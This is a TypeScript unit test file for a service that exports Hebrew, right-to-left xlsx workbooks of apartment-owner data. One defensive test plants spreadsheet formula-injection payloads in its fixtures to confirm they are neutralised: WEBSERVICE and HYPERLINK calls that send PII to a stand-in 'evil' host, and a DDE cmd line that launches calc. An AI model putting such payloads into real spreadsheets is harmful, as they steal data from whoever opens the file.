/**
 * V11 Track B.S8 — ExportService unit spec (Phase 7 / D.38 scope).
 *
 * Pure-function service — no DB, no DI beyond Logger. Tests run on
 * fixture data and inspect the produced xlsx by unzipping it and
 * parsing the underlying OOXML XML directly. This pins the contract
 * the FE / partner sees in Excel/LibreOffice/Numbers:
 *
 *   1) workbook structure: VCALENDAR-equivalent for xlsx —
 *      `xl/workbook.xml` lists exactly one sheet, `xl/worksheets/
 *      sheet1.xml` has the expected dimension + rows.
 *   2) RTL: `<sheetView rightToLeft="1" />` set on the worksheet
 *      so Excel/LibreOffice render columns A→O reading right-to-left
 *      (Doc 03 T7.1).
 *   3) Hebrew header row (row 4 after 3 metadata rows) has all 15
 *      expected labels in the expected order. Strings live in the
 *      shared-strings table (`xl/sharedStrings.xml`) — we resolve
 *      shared-string refs to verify content.
 *   4) Data rows: one per (apartment, owner). An apartment with zero
 *      owners still produces one row with blank owner cells so the
 *      manager can see the coverage gap.
 *   5) Hebrew labels for unit_type and apartment status are applied
 *      (apt→דירה, signed→חתום, etc).
 *   6) Heebo font on header row.
 *   7) **Perf budget (T7.7)** — 1000 data rows renders in < 25s
 *      on the test machine. (Free Tier is the production target;
 *      a developer laptop has more headroom, so this is a sanity
 *      ceiling, not a tight bound.)
 *   8) PII safety: the workbook metadata (creator / company /
 *      keywords) NEVER contains national_id or phone strings —
 *      only the generator's name. Defends against accidental
 *      leakage into `.xlsx` core properties.
 */
import AdmZip from 'adm-zip';
import { describe, expect, it } from 'vitest';

import {
  ExportService,
  type ProjectExportApartment,
  type ProjectExportBuilding,
  type ProjectExportInput,
  type ProjectExportOwner,
} from './export.service';

const svc = new ExportService();

function owner(
  name: string,
  pct: number,
  overrides?: Partial<ProjectExportOwner>,
): ProjectExportOwner {
  return {
    name,
    nationalId: '000000018',
    phone: '0501234567',
    email: `${name.replace(/\s+/g, '').toLowerCase()}@example.com`,
    ownershipPct: pct,
    ...overrides,
  };
}

function apt(
  number: string,
  owners: ProjectExportOwner[],
  overrides?: Partial<ProjectExportApartment>,
): ProjectExportApartment {
  return {
    id: `apt-${number}`,
    number,
    floor: 2,
    sizeSqm: 85,
    rooms: 3.5,
    status: 'pending',
    unitType: 'apt',
    areaSqm: null,
    entrance: 'א',
    owners,
    ...overrides,
  };
}

function building(address: string, apartments: ProjectExportApartment[]): ProjectExportBuilding {
  return {
    id: `bld-${address}`,
    address,
    city: 'Tel Aviv',
    block: '7104',
    parcel: '42',
    apartments,
  };
}

function baseInput(buildings: ProjectExportBuilding[]): ProjectExportInput {
  return {
    project: {
      id: 'proj-1',
      name: 'דיזנגוף 100 — תמ"א 38',
      type: 'tama38_1',
      status: 'gathering_signatures',
    },
    generatedAt: new Date('2026-05-27T12:00:00Z'),
    generatedBy: { name: 'B.S8 Manager', email: 'mgr@example.com' },
    buildings,
  };
}

// ── XML helpers (parse the xlsx OOXML by hand) ─────────────────────────
function unzip(buf: Buffer): Record<string, string> {
  const z = new AdmZip(buf);
  const out: Record<string, string> = {};
  for (const e of z.getEntries()) {
    if (!e.isDirectory) out[e.entryName] = e.getData().toString('utf8');
  }
  return out;
}
function decodeXml(s: string): string {
  return s
    .replace(/&quot;/g, '"')
    .replace(/&apos;/g, "'")
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&amp;/g, '&');
}
function sharedStrings(xml: string): string[] {
  // <si><t>...</t></si> sequence; we extract in document order and
  // decode XML entities so callers see the original cleartext.
  return Array.from(
    xml.matchAll(/<si[^>]*>(?:<t[^>]*>([\s\S]*?)<\/t>|<r>[\s\S]*?<\/r>)<\/si>/g),
  ).map((m) => decodeXml(m[1] ?? ''));
}
function cellValuesFromRow(rowXml: string, ss: string[]): string[] {
  // <c r="A1" t="s"><v>0</v></c> — `t="s"` means shared-string idx.
  // `t="str"` means inline string in <v>. Otherwise it's a number.
  // Parse each <c …>…</c> element then look at its full open-tag
  // attributes — a single greedy regex won't reliably pull an optional
  // attribute out of an arbitrary attribute order.
  const cells: string[] = [];
  for (const m of rowXml.matchAll(/<c\s([^>]*)>([\s\S]*?)<\/c>/g)) {
    const attrs = m[1] ?? '';
    const inner = m[2] ?? '';
    const t = /t="([^"]+)"/.exec(attrs)?.[1];
    const v = /<v>([^<]*)<\/v>/.exec(inner)?.[1] ?? '';
    if (t === 's') cells.push(ss[Number(v)] ?? '');
    else cells.push(v);
  }
  return cells;
}
function rowsFromSheet(sheetXml: string, ss: string[]): string[][] {
  const rows: string[][] = [];
  for (const m of sheetXml.matchAll(/<row[^>]*>([\s\S]*?)<\/row>/g)) {
    rows.push(cellValuesFromRow(m[1]!, ss));
  }
  return rows;
}

describe('V11 B.S8 · ExportService — Project → xlsx (Phase 7 / D.38)', () => {
  it('1) workbook structure: one worksheet named פרויקט with the expected files inside the .xlsx zip', async () => {
    const buf = await svc.renderProjectXlsx(
      baseInput([building('דיזנגוף 100', [apt('1', [owner('דוד כהן', 100)])])]),
    );
    const files = unzip(buf);
    expect(files['xl/workbook.xml']).toMatch(/<sheet[^/]*name="פרויקט"/);
    expect(files['xl/worksheets/sheet1.xml']).toBeDefined();
    expect(files['xl/sharedStrings.xml']).toBeDefined();
  });

  it('2) RTL — sheet view declares rightToLeft="1"', async () => {
    const buf = await svc.renderProjectXlsx(
      baseInput([building('דיזנגוף 100', [apt('1', [owner('דוד כהן', 100)])])]),
    );
    const sheet = unzip(buf)['xl/worksheets/sheet1.xml']!;
    expect(sheet).toMatch(/rightToLeft="1"/);
  });

  it('3) header row (row 4) contains the 15 Hebrew column labels in order', async () => {
    const buf = await svc.renderProjectXlsx(
      baseInput([building('דיזנגוף 100', [apt('1', [owner('דוד כהן', 100)])])]),
    );
    const z = unzip(buf);
    const ss = sharedStrings(z['xl/sharedStrings.xml']!);
    const rows = rowsFromSheet(z['xl/worksheets/sheet1.xml']!, ss);
    const headerRow = rows[3]; // 0-indexed: 3 metadata rows then header
    expect(headerRow).toEqual([
      'בניין - כתובת',
      'עיר',
      'גוש',
      'חלקה',
      'דירה',
      'קומה',
      'כניסה',
      'סוג יחידה',
      'שטח (מ"ר)',
      'חדרים',
      'סטטוס דירה',
      'בעלים',
      'תעודת זהות',
      'טלפון',
      'אחוז בעלות',
    ]);
  });

  it('4) one row per (apartment, owner); apartment with zero owners still gets one row with blank owner cells', async () => {
    const buf = await svc.renderProjectXlsx(
      baseInput([
        building('דיזנגוף 100', [
          apt('1', [owner('דוד כהן', 50), owner('שרה לוי', 50)]),
          apt('2', []), // zero owners — still one row
        ]),
      ]),
    );
    const z = unzip(buf);
    const ss = sharedStrings(z['xl/sharedStrings.xml']!);
    const rows = rowsFromSheet(z['xl/worksheets/sheet1.xml']!, ss);
    // 3 metadata + 1 header + 3 data rows (2 for apt 1, 1 for apt 2)
    expect(rows).toHaveLength(7);
    expect(rows[4]?.[11]).toBe('דוד כהן');
    expect(rows[5]?.[11]).toBe('שרה לוי');
    expect(rows[6]?.[11]).toBe(''); // gap row
    expect(rows[6]?.[4]).toBe('2'); // apt number still present
  });

  it('5) Hebrew labels — unit_type apt→דירה, status signed→חתום', async () => {
    const buf = await svc.renderProjectXlsx(
      baseInput([
        building('דיזנגוף 100', [
          apt('1', [owner('דוד כהן', 100)], { unitType: 'shop', status: 'signed' }),
        ]),
      ]),
    );
    const z = unzip(buf);
    const ss = sharedStrings(z['xl/sharedStrings.xml']!);
    const rows = rowsFromSheet(z['xl/worksheets/sheet1.xml']!, ss);
    const dataRow = rows[4]!;
    expect(dataRow[7]).toBe('חנות'); // shop
    expect(dataRow[10]).toBe('חתום'); // signed
  });

  it('6) Heebo font applied at worksheet level (header style references the named font)', async () => {
    const buf = await svc.renderProjectXlsx(
      baseInput([building('דיזנגוף 100', [apt('1', [owner('דוד כהן', 100)])])]),
    );
    const z = unzip(buf);
    // Heebo is set via `font.name = "Heebo"`; ExcelJS writes this
    // into xl/styles.xml as <name val="Heebo"/>.
    expect(z['xl/styles.xml']).toMatch(/<name val="Heebo"\s*\/>/);
  });

  it('7) perf budget — 1000 (apartment, owner) rows render well under T7.7 ceiling (25s)', async () => {
    const apts: ProjectExportApartment[] = [];
    for (let i = 0; i < 500; i += 1) {
      apts.push(
        apt(String(i + 1), [
          owner(`Owner ${i}-A`, 50, { nationalId: '000000018' }),
          owner(`Owner ${i}-B`, 50, { nationalId: '000000026' }),
        ]),
      );
    }
    const input = baseInput([building('דיזנגוף 100', apts)]);
    const t0 = Date.now();
    const buf = await svc.renderProjectXlsx(input);
    const elapsed = Date.now() - t0;
    expect(elapsed).toBeLessThan(25_000);
    // Sanity — file isn't empty.
    expect(buf.byteLength).toBeGreaterThan(10_000);
  }, 30_000);

  it('9) Wave 5 EXP-C1 — Excel formula injection neutralised on every user-supplied string cell', async () => {
    // Attacker-controlled values across every textual column. The
    // redteam payload `=WEBSERVICE(...)` exfils adjacent PII the
    // instant the manager opens the workbook on a network-connected
    // machine. After Wave 5 PR A, every such cell gets prefixed
    // with `'` so Excel displays it as text and never evaluates it.
    const buf = await svc.renderProjectXlsx(
      baseInput([
        building('=HYPERLINK("https://evil/?x="&B2,"click")', [
          apt('@cmd|"/c calc"!A1', [
            owner('=WEBSERVICE("https://evil/?n="&L2)', 100, {
              nationalId: '+123456789',
              phone: '-501234567',
            }),
          ]),
        ]),
      ]),
    );
    const z = unzip(buf);
    const ss = sharedStrings(z['xl/sharedStrings.xml']!);
    const allStrings = ss.join('\n');
    // Every dangerous leading char must now be preceded by `'`.
    // Direct char checks (not regex over `allStrings`) — none of
    // the strings in shared-strings begin with the bad chars.
    for (const s of ss) {
      if (s.length === 0) continue;
      const head = s.charCodeAt(0);
      // 0x3D `=` · 0x2B `+` · 0x2D `-` · 0x40 `@` · 0x09 TAB · 0x0D CR · 0x0A LF
      expect([0x3d, 0x2b, 0x2d, 0x40, 0x09, 0x0d, 0x0a]).not.toContain(head);
    }
    // The payload IS still in the file (not silently stripped) — just
    // text-prefixed. Verifies the recipient still SEES the value (so
    // a normal Hebrew name like `=סימן השוויון` wouldn't be lost).
    expect(allStrings).toContain('WEBSERVICE');
    expect(allStrings).toContain('HYPERLINK');
  });

  it('8) PII safety — workbook core props never contain national_id or phone strings', async () => {
    const buf = await svc.renderProjectXlsx(
      baseInput([
        building('דיזנגוף 100', [
          apt('1', [owner('דוד כהן', 100, { nationalId: '999999991', phone: '+972500000111' })]),
        ]),
      ]),
    );
    const z = unzip(buf);
    const core = z['docProps/core.xml'] ?? '';
    const app = z['docProps/app.xml'] ?? '';
    // The cleartext PII MUST live only in the sheet body, not in the
    // workbook-wide metadata. Validates a defence-in-depth posture
    // (manager-authorized export still keeps PII off the file
    // shoulder where third-party indexers / spotlight scan).
    expect(core).not.toContain('999999991');
    expect(core).not.toContain('+972500000111');
    expect(app).not.toContain('999999991');
    expect(app).not.toContain('+972500000111');
    // But the sheet body MUST have the PII (proves the value is on
    // the wire, not silently stripped).
    expect(z['xl/sharedStrings.xml']).toContain('999999991');
  });
});
